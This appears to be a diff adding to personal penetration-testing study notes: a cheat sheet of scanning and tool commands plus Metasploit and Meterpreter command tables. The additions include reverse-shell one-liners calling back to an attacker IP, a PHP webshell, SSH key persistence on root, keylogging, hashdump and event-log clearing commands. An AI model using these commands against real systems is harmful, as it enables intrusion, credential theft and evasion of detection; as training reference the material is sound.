@@ -1,4 +1,98 @@
 
+## Generic cheat sheet
+
+### Basic Tools
+
+|**Command**|**Description**|
+|---|---|
+|**General**||
+|`sudo openvpn user.ovpn`|Connect to VPN|
+|`ifconfig`/`ip a`|Show our IP address|
+|`netstat -rn`|Show networks accessible via the VPN|
+|`ssh user@10.10.10.10`|SSH to a remote server|
+|`ftp 10.129.42.253`|FTP to a remote server|
+|**tmux**||
+|`tmux`|Start tmux|
+|`ctrl+b`|tmux: default prefix|
+|`prefix c`|tmux: new window|
+|`prefix 1`|tmux: switch to window (`1`)|
+|`prefix shift+%`|tmux: split pane vertically|
+|`prefix shift+"`|tmux: split pane horizontally|
+|`prefix ->`|tmux: switch to the right pane|
+|**Vim**||
+|`vim file`|vim: open `file` with vim|
+|`esc+i`|vim: enter `insert` mode|
+|`esc`|vim: back to `normal` mode|
+|`x`|vim: Cut character|
+|`dw`|vim: Cut word|
+|`dd`|vim: Cut full line|
+|`yw`|vim: Copy word|
+|`yy`|vim: Copy full line|
+|`p`|vim: Paste|
+|`:1`|vim: Go to line number 1.|
+|`:w`|vim: Write the file 'i.e. save'|
+|`:q`|vim: Quit|
+|`:q!`|vim: Quit without saving|
+|`:wq`|vim: Write and quit|
+
+### Pentesting
+
+| **Command**                                                                           | **Description**                                                       |
+| ------------------------------------------------------------------------------------- | --------------------------------------------------------------------- |
+| **Service Scanning**                                                                  |                                                                       |
+| `nmap 10.129.42.253`                                                                  | Run nmap on an IP                                                     |
+| `nmap -sV -sC -p- 10.129.42.253`                                                      | Run an nmap script scan on an IP                                      |
+| `locate scripts/citrix`                                                               | List various available nmap scripts                                   |
+| `nmap --script smb-os-discovery.nse -p445 10.10.10.40`                                | Run an nmap script on an IP                                           |
+| `netcat 10.10.10.10 22`                                                               | Grab banner of an open port                                           |
+| `smbclient -N -L \\\\10.129.42.253`                                                   | List SMB Shares                                                       |
+| `smbclient \\\\10.129.42.253\\users`                                                  | Connect to an SMB share                                               |
+| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`                            | Scan SNMP on an IP                                                    |
+| `onesixtyone -c dict.txt 10.129.42.254`                                               | Brute force SNMP secret string                                        |
+| **Web Enumeration**                                                                   |                                                                       |
+| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`        | Run a directory scan on a website                                     |
+| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Run a sub-domain scan on a website                                    |
+| `curl -IL https://www.inlanefreight.com`                                              | Grab website banner                                                   |
+| `whatweb 10.10.10.121`                                                                | List details about the webserver/certificates                         |
+| `curl 10.10.10.121/robots.txt`                                                        | List potential directories in `robots.txt`                            |
+| `ctrl+U`                                                                              | View page source (in Firefox)                                         |
+| **Public Exploits**                                                                   |                                                                       |
+| `searchsploit openssh 7.2`                                                            | Search for public exploits for a web application                      |
+| `msfconsole`                                                                          | MSF: Start the Metasploit Framework                                   |
+| `search exploit eternalblue`                                                          | MSF: Search for public exploits in MSF                                |
+| `use exploit/windows/smb/ms17_010_psexec`                                             | MSF: Start using an MSF module                                        |
+| `show options`                                                                        | MSF: Show required options for an MSF module                          |
+| `set RHOSTS 10.10.10.40`                                                              | MSF: Set a value for an MSF module option                             |
+| `check`                                                                               | MSF: Test if the target server is vulnerable                          |
+| `exploit`                                                                             | MSF: Run the exploit on the target server is vulnerable               |
+| **Using Shells**                                                                      |                                                                       |
+| `nc -lvnp 1234`                                                                       | Start a `nc` listener on a local port                                 |
+| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`                                 | Send a reverse shell from the remote server                           |
+| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f`    | Another command to send a reverse shell from the remote server        |
+| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f`         | Start a bind shell on the remote server                               |
+| `nc 10.10.10.1 1234`                                                                  | Connect to a bind shell started on the remote server                  |
+| `python -c 'import pty; pty.spawn("/bin/bash")'`                                      | Upgrade shell TTY (1)                                                 |
+| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice                           | Upgrade shell TTY (2)                                                 |
+| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`                     | Create a webshell php file                                            |
+| `curl http://SERVER_IP:PORT/shell.php?cmd=id`                                         | Execute a command on an uploaded webshell                             |
+| **Privilege Escalation**                                                              |                                                                       |
+| `./linpeas.sh`                                                                        | Run `linpeas` script to enumerate remote server                       |
+| `sudo -l`                                                                             | List available `sudo` privileges                                      |
+| `sudo -u user /bin/echo Hello World!`                                                 | Run a command with `sudo`                                             |
+| `sudo su -`                                                                           | Switch to root user (if we have access to `sudo su`)                  |
+| `sudo su user -`                                                                      | Switch to a user (if we have access to `sudo su`)                     |
+| `ssh-keygen -f key`                                                                   | Create a new SSH key                                                  |
+| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`          | Add the generated public key to the user                              |
+| `ssh root@10.10.10.10 -i key`                                                         | SSH to the server with the generated private key                      |
+| **Transferring Files**                                                                |                                                                       |
+| `python3 -m http.server 8000`                                                         | Start a local webserver                                               |
+| `wget http://10.10.14.1:8000/linpeas.sh`                                              | Download a file on the remote server from our local machine           |
+| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`                                | Download a file on the remote server from our local machine           |
+| `scp linenum.sh user@remotehost:/tmp/linenum.sh`                                      | Transfer a file to the remote server with `scp` (requires SSH access) |
+| `base64 shell -w 0`                                                                   | Convert a file to `base64`                                            |
+| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell`                                     | Convert a file from `base64` back to its orig                         |
+| `md5sum shell`                                                                        | Check the file's `md5sum` to ensure it converted correctly            |
+
 
 ##  Infrastructure-based Enumeration
 
@@ -291,7 +385,7 @@ Web reconnaissance can be conducted using either active or passive techniques, e
 |Active Reconnaissance|Involves directly interacting with the target system, such as sending probes or requests.|Higher|Port scanning, vulnerability scanning, network mapping|
 |Passive Reconnaissance|Gathers information without directly interacting with the target, relying on publicly available data.|Lower|Search engine queries, WHOIS lookups, DNS enumeration, web archive analysis, social media|
 
-## WHOIS
+### WHOIS
 
 WHOIS is a query and response protocol used to retrieve information about domain names, IP addresses, and other internet resources. It's essentially a directory service that details who owns a domain, when it was registered, contact information, and more. In the context of web reconnaissance, WHOIS lookups can be a valuable source of information, potentially revealing the identity of the website owner, their contact information, and other details that could be used for further investigation or social engineering attacks.
 
@@ -307,7 +401,7 @@ This would return a wealth of information, including the registrar, registration
 
 However, it's important to note that WHOIS data can be inaccurate or intentionally obscured, so it's always wise to verify the information from multiple sources. Privacy services can also mask the true owner of a domain, making it more difficult to obtain accurate information through WHOIS.
 
-## DNS
+### DNS
 
 The Domain Name System (DNS) functions as the internet's GPS, translating user-friendly domain names into the numerical IP addresses computers use to communicate. Like GPS converting a destination's name into coordinates, DNS ensures your browser reaches the correct website by matching its name with its IP address. This eliminates memorizing complex numerical addresses, making web navigation seamless and efficient.
 
@@ -333,7 +427,7 @@ DNS servers store various types of records, each serving a specific purpose:
 |TXT|Stores arbitrary text information.|
 |SOA|Contains administrative information about a DNS zone.|
 
-## Subdomains
+### Subdomains
 
 Subdomains are essentially extensions of a primary domain name, often used to organize different sections or services within a website. For example, a company might use `mail.example.com` for their email server or `blog.example.com` for their blog.
 
@@ -348,7 +442,7 @@ The process of discovering subdomains is known as subdomain enumeration. There a
 
 `Active enumeration` can be more thorough but carries a higher risk of detection. Conversely, `passive enumeration` is stealthier but may not uncover all subdomains. Combining both techniques can significantly increase the likelihood of discovering a comprehensive list of subdomains associated with your target, expanding your understanding of their online presence and potential vulnerabilities.
 
-### Subdomain Brute-Forcing
+#### Subdomain Brute-Forcing
 
 Subdomain brute-forcing is a proactive technique used in web reconnaissance to uncover subdomains that may not be readily apparent through passive methods. It involves systematically generating many potential subdomain names and testing them against the target's DNS server to see if they exist. This approach can unveil hidden subdomains that may host valuable information, development servers, or vulnerable applications.
 
@@ -364,7 +458,7 @@ Code: bash
 dnsenum example.com -f subdomains.txt
 ```
 
-### Zone Transfers
+#### Zone Transfers
 
 DNS zone transfers, also known as AXFR (Asynchronous Full Transfer) requests, offer a potential goldmine of information for web reconnaissance. A zone transfer is a mechanism for replicating DNS data across servers. When a zone transfer is successful, it provides a complete copy of the DNS zone file, which contains a wealth of details about the target domain.
 
@@ -380,7 +474,7 @@ dig @ns1.example.com example.com axfr
 
 However, zone transfers are not always permitted. Many DNS servers are configured to restrict zone transfers to authorized secondary servers only. Misconfigured servers, though, may allow zone transfers from any source, inadvertently exposing sensitive information.
 
-### Virtual Hosts
+#### Virtual Hosts
 
 Virtual hosting is a technique that allows multiple websites to share a single IP address. Each website is associated with a unique hostname, which is used to direct incoming requests to the correct site. This can be a cost-effective way for organizations to host multiple websites on a single server, but it can also create a challenge for web reconnaissance.
 
@@ -398,7 +492,7 @@ gobuster vhost -u http://192.0.2.1 -w hostnames.txt
 
 In this example, `-u` specifies the target IP address, and `-w` specifies the wordlist file. Gobuster will then systematically try each hostname in the wordlist and report any that results in a valid response from the web server.
 
-### Certificate Transparency (CT) Logs
+#### Certificate Transparency (CT) Logs
 
 Certificate Transparency (CT) logs offer a treasure trove of subdomain information for passive reconnaissance. These publicly accessible logs record SSL/TLS certificates issued for domains and their subdomains, serving as a security measure to prevent fraudulent certificates. For reconnaissance, they offer a window into potentially overlooked subdomains.
 
@@ -412,7 +506,7 @@ curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value'
 
 This command fetches JSON-formatted data from `crt.sh` for `example.com` (the `%` is a wildcard), extracts domain names using `jq`, removes any wildcard prefixes (`*.`) with `sed`, and finally sorts and deduplicates the results.
 
-## Web Crawling
+### Web Crawling
 
 Web crawling is the automated exploration of a website's structure. A web crawler, or spider, systematically navigates through web pages by following links, mimicking a user's browsing behavior. This process maps out the site's architecture and gathers valuable information embedded within the pages.
 
@@ -449,7 +543,7 @@ jq -r '.[] | select(.file != null) | .file' example_data.json | sort -u
 
 This command uses `jq` to extract links, `awk` to isolate file extensions, `sort` to order them, and `uniq -c` to count their occurrences. By scrutinizing the extracted data, you can identify patterns, anomalies, or sensitive files that might be of interest for further investigation.
 
-## Search Engine Discovery
+### Search Engine Discovery
 
 Leveraging search engines for reconnaissance involves utilizing their vast indexes of web content to uncover information about your target. This passive technique, often referred to as Open Source Intelligence (OSINT) gathering, can yield valuable insights without directly interacting with the target's systems.
 
@@ -468,7 +562,7 @@ By employing advanced search operators and specialized queries known as "Google 
 
 By creatively combining these operators and crafting targeted queries, you can uncover sensitive documents, exposed directories, login pages, and other valuable information that may aid in your reconnaissance efforts.
 
-## Web Archives
+### Web Archives
 
 Web archives are digital repositories that store snapshots of websites across time, providing a historical record of their evolution. Among these archives, the Wayback Machine is the most comprehensive and accessible resource for web reconnaissance.
 
@@ -481,6 +575,97 @@ The Wayback Machine, a project by the Internet Archive, has been archiving the w
 |`Content Changes`|Track changes in website content, including text, images, and links.|Identify patterns in content updates and assess the evolution of a website's security posture.|
 
 By leveraging the Wayback Machine, you can gain a historical perspective on your target's online presence, potentially revealing vulnerabilities that may have been overlooked in the current version of the website.
+
+## Metasploit
+
+### MSFconsole Commands
+
+|**Command**|**Description**|
+|:--|:--|
+|`show exploits`|Show all exploits within the Framework.|
+|`show payloads`|Show all payloads within the Framework.|
+|`show auxiliary`|Show all auxiliary modules within the Framework.|
+|`search <name>`|Search for exploits or modules within the Framework.|
+|`info`|Load information about a specific exploit or module.|
+|`use <name>`|Load an exploit or module (example: use windows/smb/psexec).|
+|`use <number>`|Load an exploit by using the index number displayed after the search command.|
+|`LHOST`|Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells.|
+|`RHOST`|The remote host or the target. set function Set a specific value (for example, LHOST or RHOST).|
+|`setg <function>`|Set a specific value globally (for example, LHOST or RHOST).|
+|`show options`|Show the options available for a module or exploit.|
+|`show targets`|Show the platforms supported by the exploit.|
+|`set target <number>`|Specify a specific target index if you know the OS and service pack.|
+|`set payload <payload>`|Specify the payload to use.|
+|`set payload <number>`|Specify the payload index number to use after the show payloads command.|
+|`show advanced`|Show advanced options.|
+|`set autorunscript migrate -f`|Automatically migrate to a separate process upon exploit completion.|
+|`check`|Determine whether a target is vulnerable to an attack.|
+|`exploit`|Execute the module or exploit and attack the target.|
+|`exploit -j`|Run the exploit under the context of the job. (This will run the exploit in the background.)|
+|`exploit -z`|Do not interact with the session after successful exploitation.|
+|`exploit -e <encoder>`|Specify the payload encoder to use (example: exploit –e shikata_ga_nai).|
+|`exploit -h`|Display help for the exploit command.|
+|`sessions -l`|List available sessions (used when handling multiple shells).|
+|`sessions -l -v`|List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system.|
+|`sessions -s <script>`|Run a specific Meterpreter script on all Meterpreter live sessions.|
+|`sessions -K`|Kill all live sessions.|
+|`sessions -c <cmd>`|Execute a command on all live Meterpreter sessions.|
+|`sessions -u <sessionID>`|Upgrade a normal Win32 shell to a Meterpreter console.|
+|`db_create <name>`|Create a database to use with database-driven attacks (example: db_create autopwn).|
+|`db_connect <name>`|Create and connect to a database for driven attacks (example: db_connect autopwn).|
+|`db_nmap`|Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.)|
+|`db_destroy`|Delete the current database.|
+|`db_destroy <user:password@host:port/database>`|Delete database using advanced options.|
+|||
+
+---
+
+###  Meterpreter Commands
+
+|**Command**|**Description**|
+|:--|:--|
+|`help`|Open Meterpreter usage help.|
+|`run <scriptname>`|Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.|
+|`sysinfo`|Show the system information on the compromised target.|
+|`ls`|List the files and folders on the target.|
+|`use priv`|Load the privilege extension for extended Meterpreter libraries.|
+|`ps`|Show all running processes and which accounts are associated with each process.|
+|`migrate <proc. id>`|Migrate to the specific process ID (PID is the target process ID gained from the ps command).|
+|`use incognito`|Load incognito functions. (Used for token stealing and impersonation on a target machine.)|
+|`list_tokens -u`|List available tokens on the target by user.|
+|`list_tokens -g`|List available tokens on the target by group.|
+|`impersonate_token <DOMAIN_NAMEUSERNAME>`|Impersonate a token available on the target.|
+|`steal_token <proc. id>`|Steal the tokens available for a given process and impersonate that token.|
+|`drop_token`|Stop impersonating the current token.|
+|`getsystem`|Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.|
+|`shell`|Drop into an interactive shell with all available tokens.|
+|`execute -f <cmd.exe> -i`|Execute cmd.exe and interact with it.|
+|`execute -f <cmd.exe> -i -t`|Execute cmd.exe with all available tokens.|
+|`execute -f <cmd.exe> -i -H -t`|Execute cmd.exe with all available tokens and make it a hidden process.|
+|`rev2self`|Revert back to the original user you used to compromise the target.|
+|`reg <command>`|Interact, create, delete, query, set, and much more in the target’s registry.|
+|`setdesktop <number>`|Switch to a different screen based on who is logged in.|
+|`screenshot`|Take a screenshot of the target’s screen.|
+|`upload <filename>`|Upload a file to the target.|
+|`download <filename>`|Download a file from the target.|
+|`keyscan_start`|Start sniffing keystrokes on the remote target.|
+|`keyscan_dump`|Dump the remote keys captured on the target.|
+|`keyscan_stop`|Stop sniffing keystrokes on the remote target.|
+|`getprivs`|Get as many privileges as possible on the target.|
+|`uictl enable <keyboard/mouse>`|Take control of the keyboard and/or mouse.|
+|`background`|Run your current Meterpreter shell in the background.|
+|`hashdump`|Dump all hashes on the target. use sniffer Load the sniffer module.|
+|`sniffer_interfaces`|List the available interfaces on the target.|
+|`sniffer_dump <interfaceID> pcapname`|Start sniffing on the remote target.|
+|`sniffer_start <interfaceID> packet-buffer`|Start sniffing with a specific range for a packet buffer.|
+|`sniffer_stats <interfaceID>`|Grab statistical information from the interface you are sniffing.|
+|`sniffer_stop <interfaceID>`|Stop the sniffer.|
+|`add_user <username> <password> -h <ip>`|Add a user on the remote target.|
+|`add_group_user <"Domain Admins"> <username> -h <ip>`|Add a username to the Domain Administrators group on the remote target.|
+|`clearev`|Clear the event log on the target machine.|
+|`timestomp`|Change file attributes, such as creation date (antiforensics measure).|
+|`reboot`|Reboot the target machine.|
+|||
 
 
 ## XSS
